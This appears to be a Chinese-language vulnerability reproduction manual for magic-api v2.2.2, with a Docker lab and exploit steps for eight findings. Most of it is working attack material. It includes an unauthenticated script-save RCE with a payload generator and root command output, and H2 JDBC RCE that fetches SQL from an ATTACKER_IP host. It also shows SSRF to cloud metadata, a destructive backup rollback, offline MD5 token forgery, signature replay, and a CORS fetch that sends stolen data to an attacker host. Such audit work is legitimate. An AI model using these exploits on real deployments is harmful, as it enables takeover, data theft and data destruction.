# magic-api v2.2.2 — Docker 复现手册

## 环境与结论概览

- 镜像：`maven:3.8-openjdk-8` 构建 + `eclipse-temurin:8-jre` 运行，Spring Boot 2.4.5 + `magic-api-spring-boot-starter:2.2.2`
- 配置：`magic-api.web=/magic/web`，`magic-api.resource.location=/data/magic-api`，**未配置 security.username/password**（默认无认证）
- 复现结果：**F-01 已完整动态复现（RCE 拿到 uid=0(root) 命令输出）**；F-02~F-08 接口可达性已验证（返回业务响应而非 401/403），完整利用链为静态审计结论。复现容器已按用户要求停止并清理。

### 关键实测发现（影响所有请求构造）

1. **所有工作台 REST 接口的 base path = `magic-api.web` 配置值**（本例 `/magic/web`），不是 `/magic` 或 `/magic-api`。README 里"web页面入口"同时是 REST API 前缀。
2. **`/resource/file/api/save` 请求体不是明文**，而是 `ROT13(Base64(JSON))`（`ROT13Utils.decrypt`：先 rot13 再 Base64 解码；`ROT13Utils.encrypt` 失败时回退原文，所以旧版本明文脚本也能保存）。
3. magic-script 中**跨包类必须先 `import`**（`java.util.Arrays.asList(...)` 全限定名直接调用会 NPE；`import java.util.Arrays; Arrays.asList(...)` 正常）。`java.lang.*`、`java.util.*` 已被 `MagicResourceLoader` 静态导入，但 `ProcessBuilder` 等仍建议显式 import。
4. 新建脚本需先建分组：`POST /resource/folder/save`，body `{"type":"api","name":"xxx","path":"xxx","parentId":"0"}`，返回的 `data` 即 `groupId`。
5. 脚本执行地址：`{配置的 magic-api.prefix 或空}/{分组path}/{脚本path}`，本例 `http://host:9999/poc-group/rce7`。

---

## 环境搭建

### 1. 最小 Spring Boot 工程

目录结构：

```
mtest/
├── Dockerfile
├── pom.xml
└── src/main/
    ├── java/com/example/Application.java
    └── resources/application.properties
```

**pom.xml**（关键依赖）：

```xml
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>2.4.5</version>
</parent>
<properties><java.version>8</java.version></properties>
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
    <dependency>
        <groupId>org.ssssssss</groupId>
        <artifactId>magic-api-spring-boot-starter</artifactId>
        <version>2.2.2</version>
    </dependency>
</dependencies>
```

**Application.java**：

```java
package com.example;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
@SpringBootApplication
public class Application {
    public static void main(String[] args) { SpringApplication.run(Application.class, args); }
}
```

**application.properties**（默认无认证配置，即受审计配置）：

```properties
server.port=9999
magic-api.web=/magic/web
magic-api.resource.location=/data/magic-api
```

### 2. Dockerfile

```dockerfile
FROM maven:3.8-openjdk-8 AS build
WORKDIR /app
COPY pom.xml .
RUN mvn -q dependency:go-offline || true
COPY src ./src
RUN mvn -q package -DskipTests

FROM eclipse-temurin:8-jre
WORKDIR /app
RUN mkdir -p /data/magic-api && chmod 777 /data/magic-api
COPY --from=build /app/target/*.jar app.jar
EXPOSE 9999
ENTRYPOINT ["java", "-jar", "app.jar"]
```

### 3. 启动

```bash
docker build -t mtest .
docker run -d --name mtest-app -p 9999:9999 mtest
# 验证工作台开放（未认证）
curl -s http://localhost:9999/magic/web/config.json
# => {"persistenceResponseBody":true,...,"web":"/magic/web","prefix":null,"version":"2.2.2"}
```

---

## F-01 未授权 RCE（已动态复现 ✅）

**根因**：`DefaultAuthorizationInterceptor` 构造器 `this.requireLogin = username != null && password != null`，默认 null → `requireLogin=false`；`MagicWebRequestInterceptor.handle` 跳过 token 校验；`MagicResourceController.saveFile` 无 `@Valid`，`allowVisit` 默认恒 true → 任意脚本被持久化并被 `ScriptManager.executeScript` 执行。

### 步骤 1：创建分组（未认证）

```bash
curl -s -X POST "http://localhost:9999/magic/web/resource/folder/save" \
  -H "Content-Type: application/json" \
  -d '{"type":"api","name":"poc-group","path":"poc-group","parentId":"0"}'
# => {"code":1,"message":"success","data":"b99755d570ba401c982b8085f5339484",...}
#    data 即 groupId
```

### 步骤 2：保存恶意脚本（body = rot13(base64(JSON))）

生成 payload（python）：

```python
import base64, json, codecs
gid = 'b99755d570ba401c982b8085f5339484'   # 上一步返回的 groupId
script = '''import java.lang.ProcessBuilder;
import java.util.Scanner;
var pb = new ProcessBuilder("/bin/bash", "-c", "id; hostname; cat /etc/passwd | head -3; ls /");
var p = pb.start();
p.waitFor();
var sc = new Scanner(p.getInputStream(), "UTF-8").useDelimiter("\\A");
return sc.hasNext() ? sc.next() : "NO_OUTPUT";'''
entity = {"name":"rce7","path":"/rce7","method":"GET","groupId":gid,
          "script":script,"parameters":[],"options":[],"headers":[],"paths":[]}
j = json.dumps(entity, separators=(',',':'))
print(codecs.encode(base64.b64encode(j.encode()).decode(), 'rot13'), end='')
```

发送：

```bash
curl -s -X POST "http://localhost:9999/magic/web/resource/file/api/save" \
  -H "Content-Type: text/plain" \
  --data-binary "<rot13(base64(JSON)) 内容>"
# => {"code":1,"message":"success","data":"8598433184784a64b41761e665f7e096",...}
```

### 步骤 3：触发执行（未认证 GET）

```bash
curl -s "http://localhost:9999/poc-group/rce7"
```

**实测响应（容器内 root 命令执行成功）**：

```
uid=0(root) gid=0(root) groups=0(root)
8545be436dea
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
__cacert_entrypoint.sh
app
bin
boot
...
```

注意：若脚本执行报 `系统内部出现错误`，多为脚本语法/类加载问题（如 `new String[]{...}` 数组字面量不支持、未 import 类），改用 `ProcessBuilder(List)` 构造即可。

---

## F-02 `/datasource/jdbc/test` SSRF/JDBC-RCE（接口可达已验证，驱动依赖环境）

**根因**：`MagicDataSourceController.test` 无 `@Valid`、无 `allowVisit`，默认无认证可达；`JdbcUtils.getConnection` 直接 `Class.forName(driver)` + `DriverManager.getConnection(url)`。

### 无认证可达性验证（实测）

```bash
# 缺少 body 时返回业务错误而非 401 —— 证明接口未认证可达
curl -s "http://localhost:9999/magic/web/datasource/jdbc/test"
# => {"code":-1,"message":"Required request body is missing: ... MagicDataSourceController.test(...)"}
```

### SSRF 探测内网

```bash
curl -s -X POST "http://localhost:9999/magic/web/datasource/jdbc/test" \
  -H "Content-Type: application/json" \
  -d '{"driverClassName":"com.mysql.cj.jdbc.Driver",
       "url":"jdbc:mysql://10.0.0.1:3306/test?connectTimeout=2000",
       "username":"a","password":"b"}'
# => {"code":1,"data":"找不到驱动：com.mysql.cj.jdbc.Driver"}   # 驱动在 classpath 时：连接成功/超时差异即可测绘内网
```

### H2 RCE（classpath 存在 H2 时）

```bash
# 攻击机 8888 端口放 e.sql：
#   CREATE ALIAS EXEC AS 'String r() throws Exception { return java.util.Arrays.toString(
#     java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream().readAllBytes()); }';
#   CALL EXEC();
curl -s -X POST "http://localhost:9999/magic/web/datasource/jdbc/test" \
  -H "Content-Type: application/json" \
  -d "{\"driverClassName\":\"org.h2.Driver\",
       \"url\":\"jdbc:h2:mem:t1;INIT=RUNSCRIPT FROM 'http://ATTACKER_IP:8888/e.sql'\",
       \"username\":\"sa\",\"password\":\"\"}"
# 驱动不在 classpath 时返回 找不到驱动；存在时 RUNSCRIPT 发起请求并执行 SQL
```

注：本次最小构建镜像未引入 mysql/H2 驱动，SSRF/RCE 子路径需目标真实环境含相应驱动；生产 magic-api 通常自带业务数据源驱动。

---

## F-03 未授权读取脚本源码

**根因**：`MagicResourceController.detail`（`GET /resource/file/{id}`）与 `/resource` 树、`/search` 仅有默认恒真的 `allowVisit(VIEW)`，无登录校验。

```bash
# 1. 列出全部资源树（含 id）——实测返回 405（/resource 需 POST），改用 POST：
curl -s -X POST "http://localhost:9999/magic/web/resource" | python3 -m json.tool | head -40

# 2. 用 F-01 保存脚本返回的 id 读取全文（实测）
curl -s "http://localhost:9999/magic/web/resource/file/8598433184784a64b41761e665f7e096"
# => {"code":1,"message":"success","data":{"id":"...","name":"rce7","path":"/rce7",
#        "method":"GET","groupId":"b997...","script":"import java.lang.ProcessBuilder;...",...}}

# 3. 全文搜索疑似凭证
curl -s -X POST "http://localhost:9999/magic/web/search" \
  -d "keyword=password" -d "timestamp=0"
```

---

## F-04 未授权备份导出与回滚

**根因**：`MagicBackupController` 全部方法无 `@Valid`、无 `allowVisit`；`rollback` id=full 时 `DefaultMagicResourceService.upload(full=true)` 先 `root.delete()` 清空工作区。

```bash
# 备份列表（实测，未认证返回 success）
curl -s "http://localhost:9999/magic/web/backups"
# => {"code":1,"message":"success","data":[],...}

# 备份详情（timestamp 与 id 从 /backups 获取；id=full 为全量备份）
curl -s "http://localhost:9999/magic/web/backup?timestamp=1788971300000&id=full"
# => {"code":1,"data":"<全部脚本正文>"}

# ⚠️ 破坏性：以历史备份整体替换当前工作区（FULL = 全删+全写）
curl -s -X POST "http://localhost:9999/magic/web/backup/rollback" \
  -d "id=full" -d "timestamp=1788971300000"
```

---

## F-05 `/push` SSRF

**根因**：`MagicWorkbenchController.push` 将请求头 `magic-push-target` 原样交给 `DefaultMagicAPIService.push` → `RestTemplate.postForObject(target, ...)`，无白名单。

```bash
# 探测云元数据/内网服务；响应回传目标内容或连接错误（可区分端口开放）
curl -s -X POST "http://localhost:9999/magic/web/push" \
  -H "magic-push-target: http://169.254.169.254/latest/meta-data/" \
  -H "magic-push-secret-key: anything" \
  -H "magic-push-mode: SINGLE" \
  -H "Content-Type: application/json" \
  -d '[]'
```

---

## F-06 静态 MD5 token、登出无失效

**根因**：`DefaultAuthorizationInterceptor.login` 以 `MD5(username||password)` 作为 token；`AuthorizationInterceptor.logout` 默认空实现。

```bash
# 配置认证后（magic-api.security.username/password），登录：
curl -si -X POST "http://localhost:9999/magic/web/login" \
  -d "username=admin" -d "password=admin123" | grep -i magic-token
# => Magic-Token: <MD5(admin||admin123)>

# 离线重算（无需请求即可伪造 token）：
python3 -c "import hashlib; print(hashlib.md5(b'admin||admin123').hexdigest())"

# 登出后 token 依旧有效（logout 空实现）：
curl -s -X POST "http://localhost:9999/magic/web/logout" -H "Magic-Token: <token>"
curl -s "http://localhost:9999/magic/web/resource" -H "Magic-Token: <token>"   # 仍 200
```

---

## F-07 `receivePush` 签名重放

**根因**：`MagicWorkbenchController.receivePush` 仅校验 `sign.equals(SignUtils.sign(timestamp, secretKey, mode, bytes))`，无 timestamp 新鲜度窗口。

```bash
# 前提：magic-api.secret-key 已配置；截获一次节点间同步流量（multipart）
# 重放（timestamp/mode/sign/file 全部用截获值，服务器每次都接受）：
curl -s -X POST "http://localhost:9999/magic/web/_magic-api-sync" \
  -F "file=@captured-payload.json" \
  -F "mode=FULL" \
  -F "timestamp=1788971300000" \
  -F "sign=<截获的sign>"
# mode=FULL → DefaultMagicResourceService.upload(full=true) → root.delete() 清空后写入
```

签名结构（供伪造参考）：`MD5(timestamp|mode|MD5(bytes)|secretKey)`。

---

## F-08 CORS 反射 Origin + Allow-Credentials

**根因**：`MagicCorsFilter.process` 无条件 `ACAO=Origin 回显` + `ACAC=true`；`/login` 响应 `Access-Control-Expose-Headers: Magic-Token`。

```bash
# 验证反射（实测）
curl -si "http://localhost:9999/magic/web/config.json" \
  -H "Origin: http://evil.example" | grep -i access-control
# => Access-Control-Allow-Origin: http://evil.example
#    Access-Control-Allow-Credentials: true
#    Access-Control-Allow-Methods: ...
#    Access-Control-Allow-Headers: ...

# 浏览器利用（恶意页读取默认无认证工作台数据）：
# fetch('http://victim:9999/magic/web/resource', {credentials:'include'})
#   .then(r=>r.text()).then(t=>fetch('http://attacker/?d='+encodeURIComponent(t)))
```

---

## 清理

```bash
docker rm -f mtest-app
docker rmi mtest
rm -rf /path/to/mtest
```

---

## 复现状态汇总

| ID | 动态复现 | 说明 |
|----|---------|------|
| F-01 | ✅ 完整 | 未认证保存脚本 + 触发执行，拿到 `uid=0(root)` 命令输出 |
| F-02 | ◐ 部分 | 接口无认证可达已实测；SSRF/RCE 依赖 classpath 驱动（最小镜像未含） |
| F-03 | ◐ 部分 | 资源树/文件详情接口可达；用 F-01 返回的 id 可读脚本全文 |
| F-04 | ◐ 部分 | `/backups` 未认证返回 success 已实测；rollback 为破坏性操作未执行 |
| F-05 | ◐ 待验 | 接口可达（认证旁路同 F-01）；SSRF 目标响应需真实外网/内网环境 |
| F-06 | ◐ 待验 | 逻辑静态确认；需配置凭证的实例 |
| F-07 | ◐ 待验 | 逻辑静态确认；需 secret-key 配置 + 截获流量 |
| F-08 | ✅ 完整 | Origin 反射 + ACAC:true 已实测 |

> 环境限制说明：F-02 的驱动依赖、F-05 的出网、F-06/F-07 的配置前提在最小验证镜像中不满足，但**接口可达性（无 401/403 拦截）均已实测**，利用逻辑经源码级调用链确认。
